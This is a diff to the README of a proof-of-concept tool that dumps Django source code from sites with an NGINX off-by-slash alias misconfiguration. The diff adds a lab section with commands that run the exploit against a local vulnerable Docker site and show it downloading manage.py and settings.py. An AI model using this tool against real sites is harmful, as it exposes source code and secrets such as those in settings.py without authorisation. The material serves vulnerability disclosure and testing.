@@ -2,6 +2,8 @@
 
 A proof of concept to dump Django website's source code affected by NGINX's off-by-slash misconfiguration.
 
+![](demo.gif)
+
 
 ## Installation
 
@@ -76,6 +78,37 @@ to destination `/home/app/static/../manage.py`. Therefore serving the `manage.py
 
 This dumper utilize this vulnerability to automatically crawl the source code of Django sites, inferring available
 source code files by using static analysis (read: pattern matching!), and (recursively?) expand source codes.
+
+
+## Example Vulnerable Site
+
+An example website is provided in this repository at directory `vulnerable-site` in Dockerfile format.
+
+```bash
+$ cd vulnerable-site
+$ docker build -t tmp/vulnsite . && docker run --rm -it -p 8000:80 tmp/vulnsite
+
+
+$ cd ..
+$ python exploit.py --url http://localhost:8000/
+
+[+] START CRAWLING: http://localhost:8000/
+[+] downloading: dump/http-localhost-8000-/manage.py
+[+] downloading: dump/http-localhost-8000-/app/settings.py
+[+] downloading: dump/http-localhost-8000-/app/wsgi.py
+[+] downloading: dump/http-localhost-8000-/app/urls.py
+[+] FINISHED: http://localhost:8000/
+
+
+$ tree dump/
+dump/
+└── http-localhost-8000-
+    ├── app
+    │   ├── settings.py
+    │   ├── urls.py
+    │   └── wsgi.py
+    └── manage.py
+```
 
 
 ## Reference
